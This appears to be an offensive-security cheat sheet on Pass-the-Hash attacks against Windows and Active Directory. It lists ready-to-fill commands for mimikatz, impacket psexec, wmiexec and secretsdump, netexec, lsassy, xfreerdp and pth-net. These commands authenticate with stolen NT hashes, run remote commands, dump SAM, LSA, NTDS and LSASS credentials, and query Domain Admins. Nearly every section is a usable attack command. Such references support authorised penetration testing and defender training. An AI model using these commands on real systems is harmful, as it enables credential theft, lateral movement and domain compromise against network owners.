---
technique: PassTheHash
category: ntlm
protocols: SMB, WinRM, RDP, LDAP
remote_capable: true
tags: ntlm pth lateral-movement credential-use ad
---

# PassTheHash

An attacker who holds a user's NT hash can authenticate over NTLM without the plaintext password. UAC limits this for local accounts: by default only the built-in RID-500 Administrator can use PtH for remote administration; domain accounts with local admin rights are unrestricted.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| NT hash | Obtained via LSASS dump, secretsdump, DCSync, or SAM/LSA dump |
| Target exposure | SMB, WinRM, RDP, or LDAP must be reachable |
| UAC policy | `LocalAccountTokenFilterPolicy=1` required for non-RID-500 local accounts |

## Windows

### mimikatz sekurlsa::pth

#cmd #mimikatz #pth

Open an elevated process as the target user by injecting the NT hash into a new logon session.

```cmd title:"Pass-the-hash via mimikatz sekurlsa::pth"
sekurlsa::pth /user:"$target_user" /domain:"$domain" /ntlm:"$nt_hash"
```
<!-- cheat
import domain_ip
var target_user
var nt_hash
-->

## Linux

### psexec (impacket)

#impacket #smb #pth #exec

Execute commands on a remote host over SMB using an NT hash with impacket's psexec.

```sh title:"Remote exec via impacket psexec with NT hash"
psexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user@$rhost_ip"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### wmiexec (impacket)

#impacket #smb #pth #exec

Execute commands on a remote host over WMI using an NT hash with impacket's wmiexec.

```sh title:"Remote exec via impacket wmiexec with NT hash"
wmiexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user@$rhost_ip"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### secretsdump

#impacket #smb #pth #dump

Remotely dump SAM, LSA, or NTDS secrets from a target using an NT hash.

```sh title:"Remote credential dump via secretsdump with NT hash"
secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user@$rhost_ip"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### netexec (command execution)

#smb #pth #exec #multi-target

Execute a command across multiple targets using an NT hash with netexec.

```sh title:"Remote command execution via netexec with NT hash"
nxc smb "$rhost_ip" -d "$domain" -u "$user" -H "$nt_hash" -x whoami
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### netexec (SAM dump)

#smb #pth #dump #multi-target

Dump SAM hashes from multiple targets using an NT hash with netexec.

```sh title:"Remote SAM dump via netexec with NT hash"
nxc smb "$rhost_ip" -d "$domain" -u "$user" -H "$nt_hash" --sam
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### netexec (LSA dump)

#smb #pth #dump #multi-target

Dump LSA secrets from multiple targets using an NT hash with netexec.

```sh title:"Remote LSA dump via netexec with NT hash"
nxc smb "$rhost_ip" -d "$domain" -u "$user" -H "$nt_hash" --lsa
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### netexec (NTDS dump)

#smb #pth #dump #multi-target

Dump NTDS secrets from a domain controller using an NT hash with netexec.

```sh title:"Remote NTDS dump via netexec with NT hash"
nxc smb "$rhost_ip" -d "$domain" -u "$user" -H "$nt_hash" --ntds
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### lsassy (standalone)

#smb #pth #lsass-dump

Remotely dump LSASS credentials from a target using an NT hash with lsassy standalone.

```sh title:"Remote LSASS dump via lsassy standalone with NT hash"
lsassy -d "$domain" -u "$user" -H "$nt_hash" "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### lsassy (netexec module)

#smb #pth #lsass-dump

Remotely dump LSASS credentials from a target using an NT hash with lsassy as a netexec module.

```sh title:"Remote LSASS dump via lsassy netexec module with NT hash"
nxc smb "$rhost_ip" -d "$domain" -u "$user" -H "$nt_hash" -M lsassy
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### xfreerdp

#rdp #pth

Open an RDP session using an NT hash via FreeRDP.

```sh title:"RDP session via pass-the-hash with xfreerdp"
xfreerdp /u:"$user" /d:"$domain" /pth:"aad3b435b51404eeaad3b435b51404ee:$nt_hash" /v:"$rhost_ip" /h:1010 /w:1920
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### pth-net

#samr #pth #ad-ops

Perform SAMR-based AD operations (group queries, member writes) using an NT hash instead of a password.

```sh title:"AD group operations via pth-net with NT hash"
pth-net rpc group members "Domain Admins" -U "$domain/$user%aad3b435b51404eeaad3b435b51404ee:$nt_hash" -S "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->
